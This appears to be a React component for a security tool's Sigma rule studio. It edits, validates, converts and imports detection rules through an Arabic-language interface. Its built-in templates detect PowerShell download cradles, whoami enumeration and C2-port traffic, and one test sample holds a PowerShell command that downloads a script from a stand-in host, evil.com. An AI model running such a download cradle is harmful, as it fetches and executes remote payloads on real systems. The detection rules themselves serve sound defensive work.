'use client';

import React, { useState } from 'react';
import {
  X, CheckCircle2, AlertTriangle, Play, Sparkles,
  FileCode, Cpu, ShieldAlert, ArrowRight, RefreshCw, Check,
  AlertOctagon, Download, Flame, Database, Layers
} from 'lucide-react';
import {
  SigmaValidationResult,
  SigmaCompatibilityReport,
  SigmaConvertResult,
} from '../../lib/types';
import {
  validateSigmaRule,
  analyzeSigmaCompatibility,
  convertSigmaRule,
  importSigmaRule,
} from '../../lib/api';

export interface SigmaStudioModalProps {
  isOpen: boolean;
  onClose: () => void;
  onImportSuccess?: () => void;
  onRuleImported?: () => void;
}

const TEMPLATES: Record<string, { label: string; icon: string; yaml: string }> = {
  powershell: {
    label: 'تنزيلات PowerShell المشبوهة',
    icon: '⚡',
    yaml: `title: Suspicious PowerShell Download Function
id: 3b6ab547-8ec2-4991-bc65-0a4c152b08ca
status: test
description: Detects suspicious PowerShell commands executing web download cradles to fetch remote payloads.
author: SOC Detection Engineering
date: 2024/01/15
modified: 2026/01/10
license: Apache-2.0
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_proc:
        Image|endswith:
            - '\\powershell.exe'
            - '\\pwsh.exe'
    selection_cmd:
        CommandLine|contains:
            - 'DownloadString'
            - 'DownloadFile'
            - 'Net.WebClient'
    condition: selection_proc and selection_cmd
level: high
fields:
    - Image
    - CommandLine
    - User
test_samples:
    positive:
        - Image: 'C:\\Windows\\System32\\powershell.exe'
          CommandLine: 'powershell.exe -c "(New-Object Net.WebClient).DownloadString(\\"http://evil.com/p.ps1\\")"'
          User: 'SYSTEM'
    negative:
        - Image: 'C:\\Windows\\System32\\powershell.exe'
          CommandLine: 'powershell.exe -File C:\\backup.ps1'
          User: 'Admin'`,
  },
  whoami: {
    label: 'استطلاع الصلاحيات عبر Whoami',
    icon: '🔍',
    yaml: `title: Privilege Enumeration via Whoami
id: e70fa4a3-48be-4061-9c6f-6ad2fb53c306
status: test
description: Detects execution of whoami.exe with privilege enumeration switches.
author: SOC Detection Engineering
date: 2024/02/10
license: Apache-2.0
tags:
    - attack.discovery
    - attack.t1033
logsource:
    category: process_creation
    product: windows
detection:
    selection_proc:
        Image|endswith: '\\whoami.exe'
    selection_cmd:
        CommandLine|contains:
            - '/priv'
            - '/groups'
    condition: selection_proc and selection_cmd
level: medium
fields:
    - Image
    - CommandLine
    - User`,
  },
  c2port: {
    label: 'اتصال شبكي بمنافذ C2',
    icon: '🌐',
    yaml: `title: Outbound Traffic to High Risk C2 Ports
id: 8d2c4912-70b1-4f91-b3b2-7a0e5b881023
status: test
description: Detects outbound network connection attempts targeting ports commonly used by C2 beacons.
author: SOC Detection Engineering
date: 2024/03/05
license: Apache-2.0
tags:
    - attack.command_and_control
    - attack.t1071
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        DestinationPort:
            - 4444
            - 5555
            - 8888
            - 1337
    filter_internal:
        DestinationIp|startswith:
            - '127.'
            - '10.'
            - '192.168.'
    condition: selection and not filter_internal
level: high
fields:
    - SourceIp
    - DestinationIp
    - DestinationPort`,
  },
};

export function SigmaStudioModal({ isOpen, onClose, onImportSuccess, onRuleImported }: SigmaStudioModalProps) {
  const [content, setContent] = useState<string>(TEMPLATES.powershell.yaml);
  const [activeTab, setActiveTab] = useState<'editor' | 'mapping' | 'adapter' | 'test'>('editor');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [isImporting, setIsImporting] = useState<boolean>(false);
  const [validation, setValidation] = useState<SigmaValidationResult | null>(null);
  const [compatibility, setCompatibility] = useState<SigmaCompatibilityReport | null>(null);
  const [convertedAdapter, setConvertedAdapter] = useState<any>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [duplicateWarning, setDuplicateWarning] = useState<any | null>(null);

  if (!isOpen) return null;

  const handleLoadTemplate = (key: string) => {
    setContent(TEMPLATES[key].yaml);
    setValidation(null);
    setCompatibility(null);
    setConvertedAdapter(null);
    setErrorMsg(null);
    setDuplicateWarning(null);
  };

  const handleAnalyze = async () => {
    if (!content.trim()) return;
    setIsAnalyzing(true);
    setErrorMsg(null);
    setDuplicateWarning(null);

    try {
      const valRes = await validateSigmaRule(content);
      setValidation(valRes);

      if (!valRes.valid) {
        setIsAnalyzing(false);
        return;
      }

      const convRes = await convertSigmaRule(content);
      setCompatibility(convRes.compatibility);
      setConvertedAdapter(convRes.adapter);
      setActiveTab('mapping');
    } catch (err: any) {
      setErrorMsg(err.message || 'حدث خطأ أثناء فحص وتحليل كود Sigma');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleImport = async (force: boolean = false) => {
    if (!content.trim()) return;
    setIsImporting(true);
    setErrorMsg(null);
    setDuplicateWarning(null);
    setSuccessMsg(null);

    try {
      const res = await importSigmaRule(content, force);
      if (res.success) {
        setSuccessMsg(res.message || 'تم استيراد وتجميع قاعدة Sigma بنجاح كـ Adapter');
        if (onImportSuccess) onImportSuccess();
        if (onRuleImported) onRuleImported();
        setTimeout(() => {
          onClose();
        }, 1500);
      }
    } catch (err: any) {
      if (err.status === 409 || (err.message && err.message.includes('توجد قاعدة مسجلة'))) {
        setDuplicateWarning({
          message: err.message || 'تم اكتشاف قاعدة مكررة بنفس المعرف أو التجزئة',
        });
      } else {
        setErrorMsg(err.message || 'تعذر استيراد قاعدة Sigma');
      }
    } finally {
      setIsImporting(false);
    }
  };

  const getScoreBadge = (score: number) => {
    if (score >= 90) return 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30';
    if (score >= 70) return 'bg-amber-500/10 text-amber-400 border-amber-500/30';
    return 'bg-rose-500/10 text-rose-400 border-rose-500/30';
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-fade-in">
      <div className="relative w-full max-w-5xl max-h-[90vh] bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl flex flex-col overflow-hidden text-slate-100">
        
        {/* Modal Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-800 bg-slate-950/60">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-purple-500/10 border border-purple-500/20 text-purple-400">
              <Cpu className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-lg font-bold text-white">استوديو ومحول قواعد Sigma (Sigma Studio)</h3>
                <span className="px-2 py-0.5 text-xs font-semibold rounded-full bg-purple-500/20 text-purple-300 border border-purple-500/30">
                  Global Standard
                </span>
              </div>
              <p className="text-xs text-slate-400">
                تحقق، فحص التوافق الدلالي مع CanonicalEvent، ومحاكاة القواعد بنمط Adapter دون تكرار التخزين
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 text-slate-400 hover:text-white rounded-lg hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Studio Sub-Header & Templates Bar */}
        <div className="px-6 py-2.5 bg-slate-950/40 border-b border-slate-800/80 flex flex-wrap items-center justify-between gap-3 text-xs">
          <div className="flex items-center gap-2">
            <span className="text-slate-400 font-medium">قوالب جاهزة سريعة:</span>
            {Object.entries(TEMPLATES).map(([k, t]) => (
              <button
                key={k}
                onClick={() => handleLoadTemplate(k)}
                className="px-2.5 py-1 rounded-md bg-slate-800/80 hover:bg-slate-700 text-slate-300 border border-slate-700/60 transition-colors flex items-center gap-1.5"
              >
                <span>{t.icon}</span>
                <span>{t.label}</span>
              </button>
            ))}
          </div>

          {compatibility && (
            <div className="flex items-center gap-3">
              <span className="text-slate-400 font-medium">مؤشر التوافق الدلالي:</span>
              <span className={`px-3 py-0.5 rounded-full text-xs font-bold border ${getScoreBadge(compatibility.score)} flex items-center gap-1.5`}>
                <Flame className="w-3.5 h-3.5" />
                {compatibility.score}% — {compatibility.status_label_ar}
              </span>
            </div>
          )}
        </div>

        {/* Tabs Bar */}
        <div className="flex items-center gap-1 px-6 border-b border-slate-800 bg-slate-900/50">
          <button
            onClick={() => setActiveTab('editor')}
            className={`px-4 py-3 text-xs font-bold border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'editor'
                ? 'border-purple-500 text-purple-400 bg-purple-500/5'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <FileCode className="w-4 h-4" />
            محرر كود Sigma (YAML / JSON)
          </button>
          <button
            onClick={() => setActiveTab('mapping')}
            className={`px-4 py-3 text-xs font-bold border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'mapping'
                ? 'border-purple-500 text-purple-400 bg-purple-500/5'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Layers className="w-4 h-4" />
            مطابقة الحقول والتوافق (Field Mapping)
            {compatibility && (
              <span className="px-1.5 py-0.2 rounded-full text-[10px] bg-slate-800 text-slate-300">
                {compatibility.total_fields}
              </span>
            )}
          </button>
          <button
            onClick={() => setActiveTab('adapter')}
            className={`px-4 py-3 text-xs font-bold border-b-2 flex items-center gap-2 transition-colors ${
              activeTab === 'adapter'
                ? 'border-purple-500 text-purple-400 bg-purple-500/5'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Database className="w-4 h-4" />
            معاينة كائن المحول (DetectionRule Adapter)
          </button>
        </div>

        {/* Modal Body */}
        <div className="flex-1 overflow-y-auto p-6 space-y-4">
          {/* Alerts & Errors */}
          {errorMsg && (
            <div className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-start gap-3">
              <AlertOctagon className="w-5 h-5 shrink-0 mt-0.5 text-rose-400" />
              <div>
                <p className="font-bold">تعذر إكمال العملية</p>
                <p className="mt-0.5">{errorMsg}</p>
              </div>
            </div>
          )}

          {successMsg && (
            <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 shrink-0 mt-0.5 text-emerald-400" />
              <div>
                <p className="font-bold">تم بنجاح</p>
                <p className="mt-0.5">{successMsg}</p>
              </div>
            </div>
          )}

          {duplicateWarning && (
            <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300 text-xs flex items-start justify-between gap-3">
              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 shrink-0 mt-0.5 text-amber-400" />
                <div>
                  <p className="font-bold">تنبيه تكرار القاعدة (Duplicate Detection)</p>
                  <p className="mt-0.5">{duplicateWarning.message}</p>
                </div>
              </div>
              <button
                onClick={() => handleImport(true)}
                className="px-3 py-1.5 rounded-lg bg-amber-500 text-black font-bold hover:bg-amber-400 transition-colors shrink-0"
              >
                تجاوز التكرار واستبدال
              </button>
            </div>
          )}

          {validation && !validation.valid && (
            <div className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs">
              <div className="flex items-center gap-2 font-bold mb-2">
                <AlertOctagon className="w-4 h-4 text-rose-400" />
                <span>أخطاء في مواصفة Sigma:</span>
              </div>
              <ul className="list-disc list-inside space-y-1">
                {validation.errors.map((e, idx) => (
                  <li key={idx}>{e}</li>
                ))}
              </ul>
            </div>
          )}

          {/* TAB 1: Editor */}
          {activeTab === 'editor' && (
            <div className="space-y-3">
              <div className="flex items-center justify-between text-xs text-slate-400">
                <span>الصق أو حرر كود قاعدة Sigma هنا (يدعم YAML القياسي ومحول JSON):</span>
                <span className="text-[11px] font-mono text-slate-500">Lines: {content.split('\n').length}</span>
              </div>
              <textarea
                value={content}
                onChange={(e) => setContent(e.target.value)}
                rows={18}
                className="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-800 text-slate-200 font-mono text-xs focus:border-purple-500 focus:outline-none focus:ring-1 focus:ring-purple-500 transition-colors leading-relaxed selection:bg-purple-500/30"
                placeholder="title: ...&#10;logsource: ...&#10;detection: ..."
                dir="ltr"
              />
            </div>
          )}

          {/* TAB 2: Field Mapping & Compatibility Breakdown */}
          {activeTab === 'mapping' && (
            <div className="space-y-5">
              {!compatibility ? (
                <div className="text-center py-12 text-slate-400 text-xs">
                  اضغط على زر «فحص ومطابقة الحقول» لمعاينة التوافق الدلالي ومطابقة الحقول.
                </div>
              ) : (
                <>
                  {/* Gauge Card */}
                  <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 flex items-center justify-between">
                    <div>
                      <span className="text-xs text-slate-400">درجة التوافق المعياري مع خط أنابيب CanonicalEvent:</span>
                      <h4 className="text-xl font-bold text-white mt-1 flex items-center gap-2">
                        <span>{compatibility.score}%</span>
                        <span className="text-xs font-normal text-slate-400">({compatibility.status_label_ar})</span>
                      </h4>
                    </div>
                    <div className="w-48 h-3 rounded-full bg-slate-800 overflow-hidden border border-slate-700/50">
                      <div
                        className={`h-full transition-all duration-500 ${
                          compatibility.score >= 90 ? 'bg-emerald-500' : compatibility.score >= 70 ? 'bg-amber-500' : 'bg-rose-500'
                        }`}
                        style={{ width: `${compatibility.score}%` }}
                      />
                    </div>
                  </div>

                  {/* Fields Mapping Table */}
                  <div className="border border-slate-800 rounded-xl overflow-hidden bg-slate-950/40">
                    <div className="px-4 py-3 bg-slate-800/40 border-b border-slate-800 flex items-center justify-between text-xs font-bold text-slate-300">
                      <span>حقل Sigma المستهدف</span>
                      <span>المسار المطابق في المنصة (Canonical Target)</span>
                      <span>حالة التوافق</span>
                    </div>
                    <div className="divide-y divide-slate-800/60 text-xs">
                      {compatibility.fully_compatible_fields.map((f, idx) => (
                        <div key={idx} className="px-4 py-2.5 flex items-center justify-between hover:bg-slate-800/20 transition-colors">
                          <span className="font-mono font-bold text-purple-300" dir="ltr">{f.sigma_field}</span>
                          <span className="font-mono text-emerald-400" dir="ltr">{f.target}</span>
                          <span className="px-2 py-0.5 rounded text-[11px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                            مطابقة كاملة (100%)
                          </span>
                        </div>
                      ))}

                      {compatibility.partial_fields.map((f, idx) => (
                        <div key={idx} className="px-4 py-2.5 flex items-center justify-between hover:bg-slate-800/20 transition-colors">
                          <span className="font-mono font-bold text-purple-300" dir="ltr">{f.sigma_field}</span>
                          <span className="font-mono text-amber-400" dir="ltr">{f.target}</span>
                          <span className="px-2 py-0.5 rounded text-[11px] bg-amber-500/10 text-amber-400 border border-amber-500/20">
                            فحص مرن في raw_fields
                          </span>
                        </div>
                      ))}

                      {compatibility.unsupported_fields.map((f, idx) => (
                        <div key={idx} className="px-4 py-2.5 flex items-center justify-between bg-rose-500/5 hover:bg-rose-500/10 transition-colors">
                          <span className="font-mono font-bold text-rose-300" dir="ltr">{f.sigma_field}</span>
                          <span className="text-slate-400 text-[11px]">{f.reason}</span>
                          <span className="px-2 py-0.5 rounded text-[11px] bg-rose-500/10 text-rose-400 border border-rose-500/20">
                            غير مدعوم
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* MITRE ATT&CK Preview */}
                  {convertedAdapter?.mitre_attack && (
                    <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 space-y-2">
                      <span className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                        <ShieldAlert className="w-4 h-4 text-purple-400" />
                        تكتيكات وتقنيات MITRE ATT&CK المستخرجة:
                      </span>
                      <div className="flex flex-wrap gap-2 pt-1">
                        {convertedAdapter.mitre_attack.tactics?.map((t: string, idx: number) => (
                          <span key={idx} className="px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-300 border border-blue-500/30 text-xs font-medium">
                            تكتيك: {t}
                          </span>
                        ))}
                        {convertedAdapter.mitre_attack.techniques?.map((tech: string, idx: number) => (
                          <span key={idx} className="px-2.5 py-1 rounded-lg bg-purple-500/10 text-purple-300 border border-purple-500/30 text-xs font-mono font-bold">
                            {tech}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          )}

          {/* TAB 3: DetectionRule Adapter View */}
          {activeTab === 'adapter' && (
            <div className="space-y-3">
              <div className="text-xs text-slate-400">
                معاينة هيكل الـ In-Memory Adapter الذي يمرر إلى محرك الكشف المركزي:
              </div>
              <pre className="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-slate-300 overflow-x-auto max-h-[350px]" dir="ltr">
                {convertedAdapter ? JSON.stringify(convertedAdapter, null, 2) : '// اضغط «فحص ومطابقة الحقول» أولاً'}
              </pre>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="px-6 py-4 border-t border-slate-800 bg-slate-950/60 flex items-center justify-between gap-3">
          <button
            onClick={handleAnalyze}
            disabled={isAnalyzing || !content.trim()}
            className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold border border-slate-700 transition-colors flex items-center gap-2 disabled:opacity-50"
          >
            {isAnalyzing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Sparkles className="w-4 h-4 text-purple-400" />}
            <span>فحص ومطابقة الحقول</span>
          </button>

          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold transition-colors"
            >
              إلغاء
            </button>
            <button
              onClick={() => handleImport(false)}
              disabled={isImporting || !content.trim()}
              className="px-5 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-xs font-bold transition-all shadow-lg shadow-purple-600/20 flex items-center gap-2 disabled:opacity-50"
            >
              {isImporting ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Download className="w-4 h-4" />}
              <span>استيراد كقاعدة Sigma معتمدة</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default SigmaStudioModal;
